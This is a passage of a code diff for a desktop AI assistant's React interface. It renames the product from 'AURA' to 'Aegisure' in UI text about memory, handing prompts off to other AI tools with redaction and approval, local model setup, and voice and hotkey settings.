         <span>Start here</span>
-        <strong>Teach AURA a preference.</strong>
-        <p>Try: “Remember I prefer concise technical explanations.” AURA will ask you to keep, edit, or forget it.</p>
+        <strong>Teach Aegisure a preference.</strong>
+        <p>Try: “Remember I prefer concise technical explanations.” Aegisure will ask you to keep, edit, or forget it.</p>
       </article>}
     </div>
     {asArray(props.memoryInbox).length > 0 && <p className="helper-text">Memory Inbox has {asArray(props.memoryInbox).length} candidate item(s) waiting for keep, edit, or forget.</p>}
@@ -1820,12 +1820,12 @@ function AIConnectorPanel(props: { tools: any[]; privacyCheck: any; runPrivacyCh
     { id: 'codex', name: 'Codex', status: 'manual_handoff' },
     { id: 'cursor', name: 'Cursor', status: 'manual_handoff' },
   ];
-  return <section className="ai-connector-panel" aria-label="Use AURA with other AI tools">
+  return <section className="ai-connector-panel" aria-label="Use Aegisure with other AI tools">
     <div className="stream-heading">
-      <span>Use AURA with other AI tools</span>
+      <span>Use Aegisure with other AI tools</span>
       <strong>Guardian checks the handoff</strong>
     </div>
-    <p className="helper-text">AURA can prepare a helpful prompt for ChatGPT, Claude, Codex, Cursor, or the browser. Guardian scans, redacts, and asks approval before sensitive data leaves AURA.</p>
+    <p className="helper-text">Aegisure can prepare a helpful prompt for ChatGPT, Claude, Codex, Cursor, or the browser. Guardian scans, redacts, and asks approval before sensitive data leaves Aegisure.</p>
     <div className="connector-grid">
       {tools.slice(0, 6).map((tool) => <article className="connector-card" key={tool.id || tool.name}>
         <span>{tool.status || tool.platform || 'manual handoff'}</span>
@@ -1843,7 +1843,7 @@ function AIConnectorPanel(props: { tools: any[]; privacyCheck: any; runPrivacyCh
       <p>Destination: {props.privacyCheck.destination || props.privacyCheck.data_destination || 'external AI tool'}</p>
       <p>{props.privacyCheck.summary || props.privacyCheck.approval_reason || 'Guardian scanned the prompt.'}</p>
       {asArray(props.privacyCheck.labels).length > 0 && <p className="helper-text">Detected: {asArray(props.privacyCheck.labels).join(', ')}</p>}
-      {props.privacyCheck.redacted && <p className="helper-text">AURA prepared a redacted version before any handoff.</p>}
+      {props.privacyCheck.redacted && <p className="helper-text">Aegisure prepared a redacted version before any handoff.</p>}
     </div>}
   </section>;
 }
@@ -1854,7 +1854,7 @@ function OSGuardianFoundation(props: { hotkeyStatus: { ok: boolean; accelerator:
       <span>OS Guardian Foundation</span>
       <strong>Honest protection map</strong>
     </div>
-    <p>AURA Guardian protects AURA-managed actions today. True OS-wide process, network, and file-event blocking needs a signed native system extension and explicit user permission.</p>
+    <p>Aegisure Guardian protects Aegisure-managed actions today. True OS-wide process, network, and file-event blocking needs a signed native system extension and explicit user permission.</p>
     <div className="guardian-foundation-grid">
       <div><strong>Active today</strong>{OS_GUARDIAN_ACTIVE.map((item) => <span key={item}>{item}</span>)}</div>
       <div><strong>Needs permission</strong>{OS_GUARDIAN_REQUIRES_PERMISSION.map((item) => <span key={item}>{item}</span>)}</div>
@@ -1868,7 +1868,7 @@ function OSGuardianFoundation(props: { hotkeyStatus: { ok: boolean; accelerator:
 
 function ContextActionCards(props: { cards: Array<any>; startAction: (card: any) => void; coreOnline: boolean; contextKindValue: string; assistantName: string }) {
   return <div className="context-action-grid">{props.cards.map((card) => <article className="context-action-card" key={card.title}>
-    <span>{props.coreOnline ? card.readiness : 'AURA Core must connect first'}</span>
+    <span>{props.coreOnline ? card.readiness : 'Aegisure Core must connect first'}</span>
     <h3>{card.title}</h3>
     <p>{card.detail}</p>
     {card.requires !== 'none' && props.contextKindValue !== card.requires && <p className="helper-text">{missingContextMessage(card.requires, props.assistantName)}</p>}
@@ -1893,7 +1893,7 @@ function ModelStatusPanel(props: { localModelStatus: any; modelError: string; se
     <div className="glass-panel wide">
       <span>Recommended local model</span>
       <strong>{recommendation.recommended_pull || recommendation.model || props.selectedLocalModel}</strong>
-      <p>{recommendation.reason || 'AURA recommends a small private model until hardware detection completes.'}</p>
+      <p>{recommendation.reason || 'Aegisure recommends a small private model until hardware detection completes.'}</p>
       <p className="helper-text">Used for private/simple tasks, memory cleanup, routing, summaries, and draft fallback. Codex remains the coding worker.</p>
     </div>
     <div className="glass-panel wide">
@@ -1902,7 +1902,7 @@ function ModelStatusPanel(props: { localModelStatus: any; modelError: string; se
       <p>Provider: {selectedModelId === 'simple' ? 'SimpleLLM fallback' : 'Ollama'} / Model: {selectedModel}</p>
       <p>Available local models: {availableModels.length ? availableModels.join(', ') : 'None detected yet'}</p>
       <div className="panel-actions"><button onClick={props.refresh}>Retry detection</button>{ollama.installed && !ollama.running && <button onClick={props.startLocalModelRuntime}>Start Ollama</button>}<button onClick={props.skip}>Skip local model</button>{!ollama.installed && <a className="button-link" href={ollama.install_url || 'https://ollama.com/download'} target="_blank" rel="noreferrer">Install Ollama</a>}</div>
-      {ollama.installed && !ollama.running && <p className="helper-text">Ollama is installed but stopped. AURA can try `ollama serve`, or you can start the Ollama app and retry detection.</p>}
+      {ollama.installed && !ollama.running && <p className="helper-text">Ollama is installed but stopped. Aegisure can try `ollama serve`, or you can start the Ollama app and retry detection.</p>}
     </div>
     <div className="glass-panel wide">
       <span>Choose model size</span>
@@ -1944,10 +1944,10 @@ function memoryKindLabel(kind?: string) {
 
 function VoiceHotkeyPanel(props: { voiceStatus: string; speechOutputState: string; speechInputState: string; voiceEnabled: boolean; setVoiceEnabled: (value: boolean) => void; voiceCommandEnabled: boolean; setVoiceCommandEnabled: (value: boolean) => void; isListening: boolean; voiceTranscript: string; voiceUnsupportedReason: string; speak: (text: string) => void; testVoice: () => void; pushToTalk: () => void; hotkeyStatus: { ok: boolean; accelerator: string; error?: string }; assistantName: string; systemVoices: string[]; selectedVoice: string; setSelectedVoice: (value: string) => void }) {
   return <div className="voice-grid">
-    <div className="glass-panel"><span>Hotkey Setup</span><strong>{props.hotkeyStatus.ok ? 'Hotkey active' : 'Hotkey unavailable'}</strong><p>{props.hotkeyStatus.ok ? `${props.hotkeyStatus.accelerator} brings AURA forward, focuses command input, captures context, and can start listening if enabled below.` : `Hotkey unavailable - ${props.hotkeyStatus.error || 'enable Accessibility permission for AURA/Electron in System Settings, then relaunch AURA.'}`}</p><button onClick={props.pushToTalk}>Test voice button</button><p className="helper-text">macOS path: System Settings to Privacy & Security to Accessibility, then enable AURA or Electron.</p></div>
-    <div className="glass-panel"><span>Voice output</span><strong>{props.voiceEnabled ? 'Enabled' : 'Optional'}</strong><label><input type="checkbox" checked={props.voiceEnabled} onChange={e => props.setVoiceEnabled(e.target.checked)} /> Speak guidance and status</label><select aria-label="system voice" value={props.selectedVoice} onChange={(e) => props.setSelectedVoice(e.target.value)}><option value="">System default voice</option>{props.systemVoices.map((voice) => <option key={voice} value={voice}>{voice}</option>)}</select><button onClick={props.testVoice}>Test AURA voice</button><p className="helper-text">Status: {props.speechOutputState}</p></div>
-    <div className="glass-panel"><span>Voice input</span><strong>{props.isListening ? 'Listening now' : 'Native push-to-talk'}</strong><p>{props.voiceStatus}</p><label><input type="checkbox" checked={props.voiceCommandEnabled} onChange={e => props.setVoiceCommandEnabled(e.target.checked)} /> Start listening when hotkey opens AURA</label><button onClick={props.pushToTalk}>{props.isListening ? 'Stop listening' : 'Press and speak'}</button><p className="helper-text">Native Apple Speech is used when the helper is bundled. Browser speech is only a fallback. Wake word is not implemented.</p><p className="helper-text">Status: {props.speechInputState}</p>{props.voiceTranscript && <p className="transcript-pill">Transcript: {props.voiceTranscript}</p>}{props.voiceUnsupportedReason && <p className="helper-text">{props.voiceUnsupportedReason}</p>}</div>
-    <div className="glass-panel"><span>Always-on mode</span><strong>Coming later</strong><p>For now, start AURA when your Mac starts and use the hotkey or voice button.</p></div>
+    <div className="glass-panel"><span>Hotkey Setup</span><strong>{props.hotkeyStatus.ok ? 'Hotkey active' : 'Hotkey unavailable'}</strong><p>{props.hotkeyStatus.ok ? `${props.hotkeyStatus.accelerator} brings Aegisure forward, focuses command input, captures context, and can start listening if enabled below.` : `Hotkey unavailable - ${props.hotkeyStatus.error || 'enable Accessibility permission for Aegisure/Electron in System Settings, then relaunch Aegisure.'}`}</p><button onClick={props.pushToTalk}>Test voice button</button><p className="helper-text">macOS path: System Settings to Privacy & Security to Accessibility, then enable Aegisure or Electron.</p></div>
+    <div className="glass-panel"><span>Voice output</span><strong>{props.voiceEnabled ? 'Enabled' : 'Optional'}</strong><label><input type="checkbox" checked={props.voiceEnabled} onChange={e => props.setVoiceEnabled(e.target.checked)} /> Speak guidance and status</label><select aria-label="system voice" value={props.selectedVoice} onChange={(e) => props.setSelectedVoice(e.target.value)}><option value="">System default voice</option>{props.systemVoices.map((voice) => <option key={voice} value={voice}>{voice}</option>)}</select><button onClick={props.testVoice}>Test Aegisure voice</button><p className="helper-text">Status: {props.speechOutputState}</p></div>
+    <div className="glass-panel"><span>Voice input</span><strong>{props.isListening ? 'Listening now' : 'Native push-to-talk'}</strong><p>{props.voiceStatus}</p><label><input type="checkbox" checked={props.voiceCommandEnabled} onChange={e => props.setVoiceCommandEnabled(e.target.checked)} /> Start listening when hotkey opens Aegisure</label><button onClick={props.pushToTalk}>{props.isListening ? 'Stop listening' : 'Press and speak'}</button><p className="helper-text">Native Apple Speech is used when the helper is bundled. Browser speech is only a fallback. Wake word is not implemented.</p><p className="helper-text">Status: {props.speechInputState}</p>{props.voiceTranscript && <p className="transcript-pill">Transcript: {props.voiceTranscript}</p>}{props.voiceUnsupportedReason && <p className="helper-text">{props.voiceUnsupportedReason}</p>}</div>
+    <div className="glass-panel"><span>Always-on mode</span><strong>Coming later</strong><p>For now, start Aegisure when your Mac starts and use the hotkey or voice button.</p></div>
   </div>;
 }
 
@@ -1965,7 +1965,7 @@ function TestAuraCards(props: { startAction: (card: any) => void; localReady: bo
 
 function DraftReview(props: any) {
   return <div className="glass-panel draft-panel">
-    <PanelTitle eyebrow="AURA is thinking" title={props.pendingApproval ? 'Approval required' : 'Draft review'} />
+    <PanelTitle eyebrow="Aegisure is thinking" title={props.pendingApproval ? 'Approval required' : 'Draft review'} />
     <div className="context-lines">
       <div><span>Approval</span>{props.approvalState.status || 'not requested'}</div>
       <div><span>Generation</span>{props.generation.provider ? `${props.generation.provider}${props.generation.model ? ` / ${props.generation.model}` : ''}` : '-'}</div>
